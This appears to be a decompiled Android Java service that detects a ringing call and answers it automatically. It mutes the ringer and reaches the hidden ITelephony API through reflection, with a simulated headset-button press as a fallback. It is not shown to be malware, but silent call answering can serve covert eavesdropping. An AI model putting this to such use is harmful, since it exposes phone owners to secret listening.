package iits.service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import com.android.internal.telephony.ITelephony;
import iits.mamager.FileManager;
import java.lang.reflect.Method;

public class AutoAnswerIntentService extends IntentService {
    private static final String TAG = "AutoAnswerIntentService";

    public AutoAnswerIntentService() {
        super(TAG);
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        Context context = getBaseContext();
        try {
            if (((TelephonyManager) context.getSystemService("phone")).getCallState() == 1) {
                answerPhoneAidl(context);
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onHandleIntent function: " + e.toString());
            answerPhoneHeadsethook(context);
        }
    }

    private void answerPhoneHeadsethook(Context context) {
        try {
            Intent buttonDown = new Intent("android.intent.action.MEDIA_BUTTON");
            buttonDown.putExtra("android.intent.extra.KEY_EVENT", new KeyEvent(0, 79));
            context.sendOrderedBroadcast(buttonDown, "android.permission.CALL_PRIVILEGED");
            Intent buttonUp = new Intent("android.intent.action.MEDIA_BUTTON");
            buttonUp.putExtra("android.intent.extra.KEY_EVENT", new KeyEvent(1, 79));
            context.sendOrderedBroadcast(buttonUp, "android.permission.CALL_PRIVILEGED");
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on answerPhoneHeadsethook function: " + e.toString());
        }
    }

    private void answerPhoneAidl(Context context) throws Exception {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService("phone");
            Method m = Class.forName(tm.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
            m.setAccessible(true);
            ITelephony telephonyService = (ITelephony) m.invoke(tm, new Object[0]);
            telephonyService.silenceRinger();
            telephonyService.answerRingingCall();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on answerPhoneAidl function: " + e.toString());
        }
    }
}
